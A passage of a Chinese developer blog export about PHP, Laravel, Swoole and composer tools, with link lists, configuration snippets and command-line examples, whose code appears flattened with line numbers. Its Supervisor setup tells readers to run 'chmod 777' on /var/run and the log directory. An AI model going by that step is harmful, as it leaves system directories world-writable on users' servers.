微信跳一跳的 php 版本https://www.h57.pw/2018/01/05/use-php-to-achieve-wechat-jump-for-android-phones/ PHP 高效的开发量化数字货币交易程序 github.com/zhouaini528/exchanges-php PHP实现PCM格式音波文件转WAV格式音频文件 搭建私有仓库 PHP 爬虫系统 PHP 最优秀资源的整理汇集 PHP火焰图工具，支持php7 将PHP语言打造成为一门真正的通用性脚本语言 API 接口设计规范 PhpSpreadsheet 简单 Excel 导入导出 阅读过的干货文章 生成 API https://laravel.com/api/5.7/index.html 有 if 一定要有 else Dokuwiki 二次开发记录 Laravel5.5 支付宝支付 php函数 Windows 下最详细的源码编译 PHP 以及 PHP 扩展 在线采集数据 PHP 多接口获取快递物流信息包 私有云服务器 基于redis实现高可用，易拓展，接入方便，生产环境稳定运行的延迟队列 JWT 超详细分析 Laravel 5 中使用 JWT 别再这样使用JWT了！ PHP 编写的多进程网络爬虫框架 laravel扩展包——laravel-dompdf和laravel-snappy laravel中进行PDF导出遇到的问题 解决larave-dompdf中文字体显示问题 关于 DomPDF 导出中文乱码问题 Web 安全之 XSS Platform 搭建及使用实践 PHP比特币开发系列教程汇总 中国（大陆）公民身份证类 消息推送系统 Laravel 深入浅出指南 implode.io 记录分享你的代码片段 小程序社区 php以太坊 聊天应用 数据字典自动生成文档 PHPer的面试总结 方便 PHPer，Laraveler 测试代码的有用工具 30s php 巧用 PHP 数组函数 Snowflake 生成分布式唯一 ID ZipArchive 解压中文文件乱码 简聊 Session 与 Token 身份验证 基于阿里云短信服务的 PHP 扩展包 中国标准行政区划数据 实用 Markdown 编辑器 你可能不太需要 Laravel-Excel Laravel HTML 导出 PDF 方案 —– wkhtmltopdf Laravel-snappy php-rdkafka laravel Swagger 在线制作 sorry 为所欲为 nginx 实现动态生成缩略图 PHP 处理kafka消息实例 一个PHP文件搞定支付宝支付系列 PHP下kafka的实践 使用PHP处理Kafka消息 Kafka-php 基于 Laravel 可灵活自定义的的私人微信机器人 简单轻松部署你的项目 - Deployer PHP 资源列表大全 php面向对象 百度AI开放平台 PHP SDK 阿里云短信服务的 PHP 扩展包 PHP使用QueryList采集微信文章页 PHP人工智能 PHP 编写的聊天软件 PHP爬虫框架 支付系统 php leetcode 在线测试PHP JWT 超详细分析 PHP 面试常考内容之面向对象 PHP性能监控问题记录之一－安装配置php-apm PHP实现 手机号码归属地查询 Nginx to PHP-FPM 编程浪子开源云客服 音乐api 帮助个人开发者在线收款的接口服务 爬虫框架 PHP下载音乐 web即时聊天 替代serialize的扩展igbinary Docker+Nginx+MySQL+PHP (xhprof、tideways)+xhgui开发环境 PHP 并发场景 多站合一音乐搜索解决方案 构建命令行工具的库 PHP版本的 Redis命令行客户端 个人微信模板信息推送 av电影管理系统https://github.com/hldh214/gas SQL 语句优化器和重写器的 PHP 扩展包 不一样的PHP工具类 php视频网站 画江湖之算法篇 91porn爬虫php版本]]></content>
      <tags>
        <tag>php</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[laravel swoole]]></title>
    <url>%2F2018%2F12%2F10%2Flaravel-swoole%2F</url>
    <content type="text"><![CDATA[laravel 响应慢1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253https://laravel-china.org/topics/2550/the-speed-of-laravel-5-is-indeed-a-bit-slow-here-are-the-results-of-the-oneapm-testhttps://laravel-china.org/topics/3583/laravel-performance-has-always-been-difficult-to-let-go-seek-guidance项目的可维护性，是相对更加重要的。用框架损耗一点性能，来换取开发效率、可维护性是值得。至于优化性能，手段很多，一般找到性能瓶颈对其优化即可，而性能瓶颈一般不会是在框架上。比如：用 Laravel 比用XX框架，框架多消耗了 50ms。但是你发现流量上来后，瓶颈是在 IO 上（比如数据库，服务器硬盘，网络 IO）。假如可能是 mysql 数据库查询就慢了 1s。这时候要引入缓存，就可以解决该阶段的问题。在实施方案时，发现用XX框架加缓存，代码写得乱七八糟，漏洞百出。而用 Laravel，花了很短的时间和精力就上了缓存功能，并且代码优雅，结构清晰，易于维护。那么，框架的优势就体现了。不要轻易、任性、随意添加各种各样的 package ，特别是需要添加 provicder 的那种，捡最需要的来。模型的 Observer 多的话，确实会影响框架启动速度，当前的项目有二三十个，影响10~40ms的启动速度（服务器配置不一样，影响不一样），这个没办法处理了。上面这两条是我的项目确实存在的问题，并且确实对哪怕一个 hello world 的简单输出也要有影响，但是很难处理掉的。其他的挺好的，laravel 对我们的项目的进度和开发的质量真的相比其它框架提高了很多。并且线上的 8核16G OPCache，影响不太大，项目现在有100多个表，业务密集型的应用，速度满足我们的需要，大部分页面和接口 200ms 以内。最后，SQL 一定要处理好，这个可能永远是你们项目性能最大的瓶颈。Laravel 的确是一个高效且优雅的框架，作为其重度使用者的我也觉得这个框架已经被神话了。如果你有足够的时间且理解你所开发的项目，真心推荐使用 Laravel 作为项目开发框架。但是，如果，就像我说的，如果你对项目做不到知根知底、PHP 基础不扎实、周期紧张、项目影响大，所有综合因素来判定后，慎重决定。如果你真的很希望使用且愿意为后果买单，像我这样愿意深入学习其优秀特性、思想，仔细阅读文档、源码，做到举一反三甚至能做到任意改造且升级自如，那么，你还会提出这种问题吗？php7 用了吗opcache 开了吗optimaize 了吗最有用的是 php7 opcache 然后 gzip 先说内存的事，Java 和 Go 都有成熟的 GC，除非你开着全局变量并且一直往里塞东西，否则泄露不了内存，每个请求的 handler 是个闭包或者函数，只要不故意定义超过函数生命周期的变量，你不玩 off-heap 黑魔法，完全不会泄露内存。部署的话，php 和 python 差不多，比起 Java 和 Go 麻烦太多了，Go 最简单，就一个可执行文件，大部分情况下也不依赖什么运行库。Java 比起 go 稍微麻烦一点，就是需要先安装一个 JRE，然后也是一个 jar 包直接运行(现代 javaweb 一般内置了 tomcat 这类 webserver)，复杂一点就是把 war 扔到 tomcat 的 webapps 目录，它会自动重启。php 和 python 就麻烦很多了，用 pip/pear 安装扩展的时候经常会遇到 xxx.h 找不到，典型的比如 db 驱动。然后还必须前置一个 nginx 或者 apache，fastcgi 配起来还麻烦，不同框架配置方法不一样，还要提防 cgi 的 fixpath 问题。python 稍微好一些，uwsgi 比较简单，或者直接走 http 协议更简单。Java 和 Go 的最简单，把 static 资源外的直接 proxy_pass 走就行了。PHP 光是把环境搭一遍都很麻烦。php7.1 开始内置代码的 cache 了，改 php 文件是没用的，改完文件得重启 fpm 进程才能生效，这个应该是性能增强带来的副作用。在需要重启服务以后，php 的新版本手动部署，已经跟 java 或者 go 没有不同了。如果是关联数组：数组转对象可以直接用(object)()；对象转数组则要用get_object_vars()；如果是索引数组：数组转对象可以直接用(object)()；对象转数组直接用(array)()；觉得 php 部署简单的，我提个前几年遇到过好几次的场景，看看大家有没有好办法。几台服务器，无外网连接，系统有 rhel5 和 rhel6，还有 ubuntu12 和 14，还有 windows 32 位和 64 位都有，用到的数据库是 pgsql 和 db2，如何打包 php 程序过去部署？当时我的解法是，Java 给每个平台下载一个 JRE，应用打成 jar 包就好了，db 驱动也是 java 实现的，直接打进 jar 包里了，不依赖运行库。php 真的难倒了我，最后，我给每个平台下载了对应版本的 vmware，然后为 php 制作了虚拟机镜像，把兼容性工作交给了 vmware 去做。还好那些机器都有图形界面和 root 帐号，不然还得折腾无 gui 甚至无 root 的情况下怎么安装 vmware。http://php.net/manual/en/intro.opcache.php Laravel 慢不是什么地方出瓶颈了，而是 Laravel 这个框架本身就是瓶颈。优化点：1. 重构 router，特别是你的路由比较多的时候，foreach 之后还要正则就是找不痛快；2. 用 swoole 服务模式把需要重复初始化的地方抹平，只初始化一次，不过这个会进入普通 php 程序员不熟悉的领域，而且大部分业务逻辑以及第三方组件需要修改以适应服务模式；3. 放弃 Laravel我用 lumen + php 7.1 测过，Laravel 的 echo time();在 i5 的机器上，2 个路由的时候，QPS 能跑 5000 左右。路由数量 100 的时候，QPS 下降到 4000 左右。路由数量 1000 的时候，QPS 下降到 1100+。如果用了 1000 个正则做路由，我相信还会更慢。当我用 100 路由，再开启 session 的时候，QPS 从 4000 左右跌到了 1500+，腰斩了有没有？随便再引入几条正则路由，再开几个 Middleware，那 QPS 估计就跟楼主那个一样了。 修改器123456789101112131415161718&lt;?phpnamespace App\Models;use Illuminate\Database\Eloquent\Model;use Carbon\Carbon;class Baby extends Model&#123; protected $table = 'baby'; protected $appends = ['age']; public function getAgeAttribute() &#123; $date = new Carbon($this-&gt;birthday); return Carbon::now()-&gt;diffInYears($date); &#125;&#125;return $baby-&gt;age;//得到几岁 https://laravel-china.org/articles/21982 Supervisor 管理 Laravel 队列1234567891011121314151617181920212223242526sudo pip install supervisorecho_supervisord_confecho_supervisord_conf &gt; /etc/supervisord.conf默认配置文件中的supervisord.sock、supervisord.log以及supervisord.pid是放在/tmp目录下，这个目录存放的是Linux中的临时文件，一旦被系统删除，就会提示unix:///tmp/supervisor.sock no such file，所以我们要把这三个文件放到其他目录中保存。sudo chmod 777 /var/runsudo chmod 777 /var/log/supervisorsupervisord -c /etc/supervisord.confpgrep supervisord | xargs ps -u --pidUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 13744 0.0 1.7 226320 17460 ? Ss 1月12 0:08 /bin/python /usr/bin/supervisord -c /etc/supervi[program:larashop-worker] ;项目名称process_name=%(program_name)s_%(process_num)02dcommand=php (填入你的artisan路径)/artisan queue:work redis --sleep=3 --tries=3 ;需要启动的命令autostart=trueautorestart=trueuser=root ;此处填入你运行WEB应用的用户numprocs=8 ;进程数redirect_stderr=true ;把 stderr 重定向到 stdout，默认 falsestdout_logfile=/var/log/supervisor/larashop-queue.log ;注意分配好日志文件夹权限supervisorctl reread # 读取有更新（增加）的配置文件，不会启动新添加的程序supervisorctl update # 重启配置文件修改过的程序supervisorctl start larashop-worker:* # 启动 larashop-worker 程序supervisorctl status # 查看状态 如果在Laravel中修改了队列代码，需要重启Supervisor才能生效 Swoole 与 Laravel 结合使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102修改php.ini，增加swoole.use_namespace=On开启。使用命名空间类名后，旧式的下划线风格类名将不可用。namespace App\Console\Commands;use Illuminate\Console\Command;use App\Repositories\PushRepository;class Push extends Command&#123; /** * The name and signature of the console command. * * @var string */ protected $signature = 'push:start'; /** * The console command description. * * @var string */ protected $description = '推送服务启动命令'; /** * push处理推送任务的对象实例 */ protected $_repPush; /** * Create a new command instance. * * @param DripEmailer $drip * @return void */ public function __construct(PushRepository $repPush) &#123; parent::__construct(); $this-&gt;_repPush = $repPush; &#125; /** * Execute the console command. * * @return mixed */ public function handle() &#123; $this-&gt;_repPush-&gt;start(); &#125;&#125;/** * 消息推送服务 * @author: KongSeng &lt;643828892@qq.com&gt; */ namespace App\Repositories; use \Swoole\Server; use Config; class PushRepository extends BaseRepository &#123; /** * Swoole Server 服务 */ private $__serv = null; /** * 构造函数 */ public function __construct()&#123; $this-&gt;__initSwoole(); &#125; /** * 初始化swoole */ private function __initSwoole()&#123; $host = Config::get('swoole.host'); $port = Config::get('swoole.port'); $setConf = Config::get('swoole.set'); $this-&gt;__serv = new Server($host,$port); $this-&gt;__serv-&gt;set($setConf); $this-&gt;__serv-&gt;on('receive', array($this,'onReceive')); &#125; /** * 数据接收回调 */ public function onReceive($serv, $fd, $from_id, $data)&#123; $serv-&gt;send($fd,$data."\r\n"); &#125; /** * 开启服务https://laravel-china.org/articles/22712 */ public function start()&#123; $this-&gt;__serv-&gt;start(); &#125; &#125; php artisan push:start Websocket 服务中使用 Swoole123456789101112131415$server = new swoole_websocket_server('php', 9501);$server-&gt;on('start', function (swoole_websocket_server $server) &#123; echo "Server has been started!\n";&#125;);$server-&gt;on('open', function (swoole_websocket_server $server, $request) &#123; echo "websocket: new connection, id: &#123;$request-&gt;fd&#125;\n";&#125;);$server-&gt;on('message', function (swoole_websocket_server $server, $frame) &#123; echo "websocket: &#123;$frame-&gt;fd&#125;:&#123;$frame-&gt;data&#125;,opcode:&#123;$frame-&gt;opcode&#125;,fin:&#123;$frame-&gt;finish&#125;\n"; $server-&gt;push($frame-&gt;fd, "Replying, you sent " . $frame-&gt;data);&#125;);$server-&gt;on('close', function (swoole_websocket_server $server, $fd) &#123; echo "websocket: connection with id &#123;$fd&#125; has been closed\n";&#125;);$server-&gt;start(); Lumen 5.2 手动补回 artisan serve 指令123456789101112131415161718Lumen 5.2 版本之前，通过php artisan serve指令即可快速启动调试https://blog.gxxsite.com/lumen-php-artisan-serve-local-debug-solution/Lumen 5.2 简化了 artisan，把serve精简掉了，用以下代码可以快速启动：php -S localhost:8080 -t ./public但是习惯了还是 serve 顺手吧，补充的方法如下：通过composer安装lumen-artisan-serve： composer require mlntn/lumen-artisan-serve "~1"修改app/Console/Kernel.php文件扩展artisan命令 protected $commands = [ \Mlntn\Console\Commands\Serve::class ];至此，serve指令又能用了：php artisan serve --port=8080 MySQL 频繁出错 Packets out of order. Expected 1 received 111. Packet size123456789在swoole start函数前创建了mysql连接, 那么后续所有的worker以及task多个子进程都是使用一开始主进程的这个数据库连接。如果有多个子进程同时使用该连接与数据库通信(进程切换)，那么就可能因为通信协议时序的不正确导致mysql出现异常。解决方案:在swoole start函数前注销mysql连接, DB::disconnect();相关文章:1.Server中对象的4层生命周期 https://wiki.swoole.com/wiki/page/354.html2.是否可以共用1个redis或mysql连接 https://wiki.swoole.com/wiki/page/325.htmlhttps://learnku.com/articles/28953 基于swoole实现的微信机器人 swoole 协程之旅 轻松部署 Laravel 应用 《Laravel 入门教程》 Swoole 是 PHP 中的 Node.js -从生命周期看 Dingo API 是如何接管 Laravel 路由的 配置 Supervisor 管理 Laravel 队列 swoole 协程之旅 workerman实现服务间通讯 Laravel Queue——消息队列任务处理器源码剖析 Laravel 源码阅读之二：Illuminate\Foundation\Application 类初始化分析 开源了一个小小的商城 Laravel 和 Swoole 的高性能框架 基于 swoole 的高性能 PHP 框架 Laravel 应用中的 Swoole 集成 聊天室系统 不用三方包 给 Laravel 开启 Swoole 基于 Laravel-swoole 开发部署的在线聊天室 一个线上提交作业的平台 使用数据库连接池提高性能 laravel swoole 为什么我不太想用 Laravel laravel 寫 APP 接口 laracast 视频教程系列笔记 我独自走进 Laravel5.5 的❤（八） Laravel面试 Laravel，PHP 如何使用数据库连接池提高性能 Swoole 源码分析 Laravel 5 系列入门教程 Laravel 到底能慢到什么程度 使用 laragon 的 ngrok 功能在本地开发微信公众号 php框架压测 Laravel 每个控制器都需要写个路由 Laravel 项目加速指南 opcache 的统计功能 基于 Swoole 开发的 MySQL 数据库连接池SMProxy laravel 优化 国内使用 laravel phwoolcon laravel和Uikit开发的后台管理系统雏形 自带完整oauth授权管理模块 Laravel HTML 导出 PDF 方案 - 《2018年小米高级 PHP 工程师面试题（模拟考试卷）》答案解析 [ 未指定版本 ] laravel Facades 原理 (代码执行流程分析) MySQL · 最佳实践 · 分区表基本类型 《2019年小米春季上海 PHP 实习生招聘面试题》部分答案解析 [ 千人千面 ] Laravel 之道 基于 laravelS 和 layim 的聊天系统 PHP 高级工程面试题汇总 Laravel 深入浅出指南 基于 swoole 协程的 MySQL 连接池 swoole 加速 Lumen5.7 Restful API 接口 Laracasts 系列教程 Laravel核心代码学习 laravel5.5 支付—— 支付宝 GatewayWorker 手册 Laravel 深入核心系列教程 PHP 框架性能测试比较 Swoole 加速 Laravel/Lumen swoft Laravel 源码阅读指南 基于 laravelS 和 layim 的聊天系统 快速集成Swoole到Laravel lumen Laravel 源码阅读之一：Composer 自动加载分析 Laravel 中文文档检索 Alfred Workflow 基于 Laravel 框架开发的基础权限后台系统 Laravel 下 Elasticsearch 使用 markdown文档 基于 Laravel 框架的 rbac 后台管理系统 Laravel5配置读写分离和源码分析 Laravel-swoole 开发部署的在线聊天室 PHP 与 Swoole 浅析与学习]]></content>
      <tags>
        <tag>laravel</tag>
        <tag>swoole</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php命令行工具]]></title>
    <url>%2F2018%2F12%2F05%2Fphp%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[composer镜像composer全局安装的命令路径 C:\Users\xxx\AppData\Roaming\Composer\vendor\bin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107composer global require slince/composer-registry-manager$ composer repo:ls composer https://packagist.org phpcomposer https://packagist.phpcomposer.com composer-proxy https://packagist.composer-proxy.org * laravel-china https://packagist.laravel-china.org cnpkg https://php.cnpkg.orgcomposer repo:use laravel-chinacomposer require 安装的时候可能会把.git目录也下载了，因为木有php-zip扩展，所以使用的git clone 来下载，默认是wget要列出所有已安装的包及其版本号和说明，只需使用 show:composer show有时候把这些信息用依赖关系树的形式查看会更容易理解， 可以通过 --tree or -t 参数:composer show -t如果要筛选返回的包，可以使用通配符传递一个额外的字符串参数 *:composer show -tacacha/admin-lte-template-laravel 1.0.5 AdminLTE template applied to Laravel Scaffolding├──illuminate/console ~5.0├──illuminate/support ~5.0└──php &gt;=5.4.0baum/baum 1.1.1 Baum is an implementation of the Nested Set pattern for Eloquent models.├──illuminate/console 5.*├──illuminate/database 5.*├──illuminate/events 5.*├──illuminate/filesystem 5.*├──illuminate/support 5.*└──php &gt;=5.4.0cloudmario/scs dev-master PHP SDK for 新浪云存储└──php &gt;=5.2.0firephp/firephp-core v0.4.0 Traditional FirePHPCore library for sending PHP variables to the browser.guzzlehttp/guzzle 5.3.1 Guzzle is a PHP HTTP client library and framework for building RESTful web service clients├──guzzlehttp/ringphp ^1.1│ ├──guzzlehttp/streams ~3.0│ │ └──php &gt;=5.4.0│ ├──php &gt;=5.4.0│ └──react/promise ~2.0│ └──php &gt;=5.4.0└──php &gt;=5.4.0jenssegers/mongodb v2.1.9 A MongoDB based Eloquent model and Query builder for Laravel 4├──illuminate/container ^5.0├──illuminate/database ^5.0├──illuminate/events ^5.0├──illuminate/support ^5.0└──php &gt;=5.4.0composer show 'symfony/*'如果要查看有关特定包的信息，需要完整包名:$ composer show laravel/frameworkname : laravel/frameworkdescrip. : The Laravel Framework.keywords : framework, laravelversions : * v5.0.16type : librarylicense : MIT License (MIT) (OSI approved) https://spdx.org/licenses/MIT.html#licenseTextsource : [git] https://github.com/laravel/framework.git 861a1e78c84dca82fe4bd85d00349c52304eea77dist : [zip] https://api.github.com/repos/laravel/framework/zipball/861a1e78c84dca82fe4bd85d00349c52304eea77 861a1e78c84dca82fe4bd85d00349c52304eea77如果您想知道安装特定软件包的原因，可以使用 why 命令来确定哪些依赖项需要它：composer why vlucas/phpdotenvcomposer why vlucas/phpdotenv -t使用 --verbose 或 -v 参数来查看本地修改的软件包和文件：composer status -v$ composer licensesName: laravel/laravelVersion: dev-dev_wzpLicenses: MITDependencies:Name Version Licenseacacha/admin-lte-template-laravel 1.0.5 MITbacon/bacon-qr-code 1.0.1 BSD-2-Clausebaum/baum 1.1.1 MITclasspreloader/classpreloader 1.2.0 MITcloudmario/scs dev-master 5294387 MIT检测一下已安装的包，哪些有可以升级的。这可以使用 outdated 命令。composer outdatedacacha/admin-lte-template-laravel 1.0.5 6.0bacon/bacon-qr-code 1.0.1 2.0.0classpreloader/classpreloader 1.2.0 3.2.0cloudmario/scs dev-master 5294387 dev-master 4610269danielstjules/stringy 1.9.0 3.1.0doctrine/inflector v1.0.1 v1.3.0doctrine/instantiator 1.0.5 1.2.0evenement/evenement v2.0.0 v3.0.1guzzlehttp/guzzle 5.3.1 6.3.3guzzlehttp/psr7 1.3.1 1.5.2Laravel 最近发布了一个新的 5.8 版本的框架；我们可以使用 why-not 命令检查任何阻止我们更新 laravel/framework 包的包：composer why-not laravel/framework 5.8如果您想知道安装特定软件包的原因，可以使用 why 命令来确定哪些依赖项需要它：composer why vlucas/phpdotenvlaravel/framework v5.0.16 requires vlucas/phpdotenv (~1.0)https://learnku.com/laravel/t/28678 多线程下载composer1234国内源搭配多线程下载composercomposer global require hirak/prestissimocomposer create-project laravel/laravel laravel1 --no-progress --profile --prefer-disthttps://github.com/hirak/prestissimo httpstat1234567$ git clone https://github.com/talhasch/php-httpstat$ cd php-httpstat$ cp httpstat.php /usr/local/bin/httpstat$ chmod +x /usr/local/bin/httpstat $ httpstat http://www.google.com PHP 静态代码分析phan123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136https://laravel-china.org/topics/19011 https://github.com/nunomaduro/larastan https://laravel-china.org/topics/20768git clone https://github.com/nikic/php-astcd php-ast/phpizesudo ./configure --with-php-config=/php7/bin/php-config --enable-astsudo makesudo make installphp7 --inivi /etc/php.ini extension = ast.so# 就能看到扩展啦php -m | grep astcurl -sS https://getcomposer.org/installer | php7mkdir testcd testwhich php$ composer config -g repo.packagist composer https://packagist.laravel-china.orgphp7 /usr/bin/composer require --dev "phan/phan:1.x"vi src/a.php &lt;?php class A extends B &#123; public function a1() &#123; return $this-&gt;a2(1); &#125; /** * @param array $b * * @return int */ private function a2($b) &#123; return $b + 1; &#125; &#125; 写个shell脚本 vi test.sh #!/bin/bash function log() &#123; echo -e -n "\033[01;35m[YUNQI] \033[01;31m" echo $@ echo -e -n "\033[00m" &#125; Color_Text() &#123; echo -e " \e[0;$2m$1\e[0m" &#125; Echo_Red() &#123; echo $(Color_Text "$1" "31") &#125; Echo_Green() &#123; echo $(Color_Text "$1" "32") &#125; Echo_Yellow() &#123; echo $(Color_Text "$1" "33") &#125; : &gt; file.list for file in $(ls src/*) do echo $file &gt;&gt; file.list done Echo_Green "file list:\n" Echo_Green "========================\n" cat file.list Echo_Green "========================\n" Echo_Yellow "Phan run\n" Echo_Yellow "========================\n" ./vendor/bin/phan -f file.list -o res.out Echo_Yellow "========================\n" Echo_Red "error log\n" Echo_Red "========================\n" cat res.out Echo_Red "========================\n" #https://mengkang.net/1356.html [root@localhost ast]# sh test.sh file list: ======================== src/a.php ======================== Phan run ======================== PHP Warning: Unsupported declare 'strict_types' in /ast/vendor/phan/phan/src/phan.php on line 1 PHP Parse error: syntax error, unexpected T_FUNCTION, expecting T_PAAMAYIM_NEKUDOTAYIM in /ast/vendor/phan/phan/src/phan.php on line 29 ======================== error log ======================== cat: res.out: No such file or directory ======================== [root@localhost ast]# vi vendor/bin/phan #!/usr/bin/env php7 &lt;?php require_once __DIR__ . '/src/phan.php'; # 安装 composer require --dev nunomaduro/larastan # 分析代码 php artisan code:analyse 而 code:analyse 命令有些参数可以帮助你自定义分析过程。 # 默认为 5。0 表示最宽松，7 表示最严格。 php artisan code:analyse --level=[0-7] # 分析指定的路径。 php artisan code:analyse --paths="modules,app,domain" 安装的时候如果出现提示 Your requirements could not be resolved to an installable set of packages. 改用以下的命令安装 先执行 composer update 再执行 composer require nunomaduro/larastan --update-with-all-dependencies phpcs命令行音乐搜索下载器123$ composer global require guanguans/music-php$ ./path/music-phphttps://github.com/guanguans/music-php phpmd语法检测123composer require overtrue/phplint --dev -vvv$ ./vendor/bin/phplint ./ --exclude=vendor$ ./vendor/bin/phplint psysh管理缓存123456https://learnku.com/articles/26314$ curl -sO http://gordalina.github.io/cachetool/downloads/cachetool.phar$ chmod +x cachetool.phar$ php cachetool.phar opcache:reset --fcgi php7cc语法检测123456//https://github.com/sstalle/php7cc/releasescomposer global require sstalle/php7ccexport PATH="$PATH:$HOME/.config/composer/vendor/bin"php7cc /path/to/my/file.phpphp7cc /path/to/my/directory/php7cc --level=error /path/to/my/directory/ &gt; error.txt 内网穿透spike123composer global require slince/spike$ spiked --address=127.0.0.1:8088https://github.com/slince/spike/blob/master/README-zh_CN.md phpcbf加速composer开启多线程安装下载123$ composer global require hirak/prestissimo$ composer global remove hirak/prestissimo$ composer create-project laravel/laravel laravel1 --no-progress --profile --prefer-dist 包构建工具package-builder12345678910111213//安装工具$ composer global require 'overtrue/package-builder' --prefer-source创建项目$ package-builder build [目标目录]$ package-builder build ./weather# 然后按提示操作即可# 包名：xkeyi/weather# 命名空间：Xkeyi\Weather # 描述：A weather SDK接下来我们需要在 composer.json 中声明包自动加载的命名空间，进入项目目录，执行命令：composer dump-autoload pecl1234pecl install swoole 默认是按照最新版的，如果有你的环境php不是最新，那需要按照PHP版本去安装安装PHP是7.1版本的swoolepecl -d php_suffix=7.1 install swoole-1.9.23pecl channel-update pecl.php.net 经纬度行政区域查询123curl "http://116.196.105.215:1234/gis?auth_user=freevip&amp;latitude=39.880655&amp;longitude=116.354386"&#123;"error":0,"msg":"成功","data":&#123;"country":"CHN","en0":"","en1":"","en2":"","en3":"","zh0":"中国","zh1":"北京市","zh2":"","zh3":"西城区"&#125;&#125; 格式化 SQL1234567composer global require jdorn/sql-formattersql-formatter "SELECT SOME QUERY;" // 直接格式化// 或echo "SELECT SOME QUERY;" | sql-formatter // 使用管道，更适合较大量的 SQL 语句 将 PHP 应用快速打包为 PHAR12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970composer require humbug/boxvendor/bin/box compile [root@VM_0_14_centos blog]# vendor/bin/box compile ____ / __ )____ _ __ / __ / __ \| |/_/ / /_/ / /_/ /&gt; &lt;/_____/\____/_/|_|Box version 3.4.0@4eeb285 // Loading without a configuration file.In Assertion.php line 2550: File "/usr/share/nginx/html/blog/index.php" was expected to exist.compile [-c|--config CONFIG] [--debug] [--no-parallel] [--no-restart] [--dev] [--no-config] [--with-docker] [-d|--working-dir WORKING-DIR] [ERROR] The configuration file is invalid.[root@VM_0_14_centos blog]# touch index.php[root@VM_0_14_centos blog]# vendor/bin/box compile ____ / __ )____ _ __ / __ / __ \| |/_/ / /_/ / /_/ /&gt; &lt;/_____/\____/_/|_|Box version 3.4.0@4eeb285 // Loading without a configuration file.🔨 Building the PHAR "/usr/share/nginx/html/blog/index.phar"? No compactor to register? Adding main file: /usr/share/nginx/html/blog/index.php? Adding requirements checker? Adding binary files &gt; No file found? Auto-discover files? Yes? Adding files &gt; 4828 file(s)? Generating new stub - Using shebang line: #!/usr/bin/env php - Using banner: &gt; Generated by Humbug Box 3.4.0@4eeb285. &gt; &gt; @link https://github.com/humbug/box? Dumping the Composer autoloader? Removing the Composer dump artefacts? No compression? Setting file permissions to 0755* Done.No recommendation found.No warning found. // PHAR: 4865 files (24.51MB) // You can inspect the generated PHAR with the "info" command. // Memory usage: 83.76MB (peak: 85.63MB), time: 109.71s phptrace1234567891011121314151617181920wget https://github.com/Qihoo360/phptrace/archive/v1.0.1-beta.tar.gztar -zxvf v1.0.1-beta.tar.gzcd phptrace-1.0.1-beta/extension/usr/local/php/bin/phpize./configure --with-php-config=/usr/local/php/bin/php-configmakemake install-allSee any operating system documentation about shared libraries formore information, such as the ld(1) and ld.so(8) manual pages.----------------------------------------------------------------------Installing shared extensions: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/Installing PHP Trace binary: /usr/local/php/bin/[root@VM_0_14_centos extension]# php --iniConfiguration File (php.ini) Path: /usr/local/php/libLoaded Configuration File: /usr/local/php/lib/php.iniScan for additional .ini files in: (none)Additional .ini files parsed: (none)vi /usr/local/php/lib/php.iniextension = trace.so /usr/local/php/bin/phptrace -p 19248 gdb12345678910111213141516for ($i = 0; $i &lt; 3; $i ++) &#123; echo $i . PHP_EOL; if ($i == 2) &#123; $j = $i + 1; var_dump($j); &#125; sleep(1);&#125;gdb php(gdb)run index.php...012int(3)[Inferior 1 (process 577) exited normally] curl1234567891011121314curl -x 123.45.67.89:1080 -o page.html http://www.yahoo.com 使用代理访问添加 --data 或 -D 后面跟传递的参数，再加网址，即可发送POST请求curl -D "name=jack&amp;age=22" 127.0.0.1:8899/post如果要对数据内容做编码处理，可使用 –data-urlencode 参数curl -D "name=jack jason&amp;age=22" 127.0.0.1:8899/postcurl --e http://www.example.com http://www.example.com用curl通过dict协议去查字典curl dict://dict.org/d:computerftp下载上传curl -u name:passwd ftp://ip:port/path/filecurl -T localfile -u name:passwd ftp://upload_site:port/path/ 代码检查工具12345678composer require --dev bamarni/composer-bin-plugincomposer require nunomaduro/phpinsights# Mac &amp; Linux./vendor/bin/phpinsights# Windows.\vendor\bin\phpinsights.bat 格式化并高亮 SQL 语句123456789101112131415161718composer global require jdorn/sql-formattersql-formatter "SELECT SOME QUERY;" // 直接格式化// 或echo "SELECT SOME QUERY;" | sql-formatter // 使用管道，更适合较大量的 SQL 语句&lt;?phprequire_once('SqlFormatter.php');$query = "SELECT count(*),`Column1`,`Testing`, `Testing Three` FROM `Table1` WHERE Column1 = 'testing' AND ( (`Column2` = `Column3` OR Column4 &gt;= NOW()) ) GROUP BY Column1 ORDER BY Column3 DESC LIMIT 5,10";echo SqlFormatter::format($query);echo SqlFormatter::format($query, false);https://wi1dcard.cn/posts/format-sql-statements-in-php/ 命令行翻译器123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172全局安装$ composer global require jonasyeah/client-translator 1/11: https://packagist.laravel-china.org/p/provider-archived$2edb7b4fbca3e9f5a61bfdda69582a5e3843b748dd030acf2ec34104f65c6d17.json 2/11: https://packagist.laravel-china.org/p/provider-2013$09a8bafcb621ca7068e4068038ea0cccc1f8be98ec5c91bdcfe8fcc4261cbc95.json 3/11: https://packagist.laravel-china.org/p/provider-2014$0a5ce8b24ddb8417ea7288cb02cf77a82ca7f2f4103fff9065cbe8d22747bad0.json 4/11: https://packagist.laravel-china.org/p/provider-2019-01$a8369df8eeb94ae1e149a7ed59354b065e6eb83af6f3b2ee29cc9d09035a969f.json 5/11: https://packagist.laravel-china.org/p/provider-latest$7f7119f65482d6cbae99422a9801b81a24b7b884e2d8254b2372c51f2af27ae2.json 6/11: 